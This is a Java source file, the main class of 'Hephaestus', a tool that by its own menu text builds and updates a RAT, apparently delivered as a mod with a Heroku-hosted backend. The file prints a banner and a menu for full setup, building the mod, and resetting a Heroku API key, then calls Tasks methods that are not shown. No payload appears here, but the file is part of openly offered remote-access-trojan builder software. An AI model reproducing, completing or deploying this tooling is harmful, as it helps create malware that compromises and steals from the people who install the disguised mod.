package studio.dreamys;

import org.apache.commons.io.FileUtils;

import java.io.File;
import java.util.Scanner;

public class Hephaestus {
    public static Scanner sc = new Scanner(System.in);

    public static void main(String[] args) {
        System.out.println("\n /$$   /$$                     /$$                                       /$$                        \n" +
                "| $$  | $$                    | $$                                      | $$                        \n" +
                "| $$  | $$  /$$$$$$   /$$$$$$ | $$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$$ /$$$$$$   /$$   /$$  /$$$$$$$\n" +
                "| $$$$$$$$ /$$__  $$ /$$__  $$| $$__  $$ |____  $$ /$$__  $$ /$$_____/|_  $$_/  | $$  | $$ /$$_____/\n" +
                "| $$__  $$| $$$$$$$$| $$  \\ $$| $$  \\ $$  /$$$$$$$| $$$$$$$$|  $$$$$$   | $$    | $$  | $$|  $$$$$$ \n" +
                "| $$  | $$| $$_____/| $$  | $$| $$  | $$ /$$__  $$| $$_____/ \\____  $$  | $$ /$$| $$  | $$ \\____  $$\n" +
                "| $$  | $$|  $$$$$$$| $$$$$$$/| $$  | $$|  $$$$$$$|  $$$$$$$ /$$$$$$$/  |  $$$$/|  $$$$$$/ /$$$$$$$/\n" +
                "|__/  |__/ \\_______/| $$____/ |__/  |__/ \\_______/ \\_______/|_______/    \\___/   \\______/ |_______/ \n" +
                "                    | $$                                                                            \n" +
                "                    | $$                                                                            \n" +
                "release 2.0         |__/                 https://dsc.gg/dxxxxy                           dxxxxy#0776\n");

        System.out.println("Choose a task...");
        System.out.println("0. Full setup (can re-use remote to update rat)");
        System.out.println("1. Build mod from existing heroku app");
        System.out.println("---Extra---");
        System.out.println("2. Change heroku api key");
        int task = sc.nextInt();
        switch (task) {
            case 0:
                Tasks.fullSetup();
                break;
            case 1:
                Tasks.modOnly();
                break;
            case 2:
                FileUtils.deleteQuietly(new File(Tasks.path + "\\herokuapikey.hephaestus"));
                Tasks.getHerokuAPIKey();
                break;
            default:
                System.out.println("Invalid task");
        }
    }
}
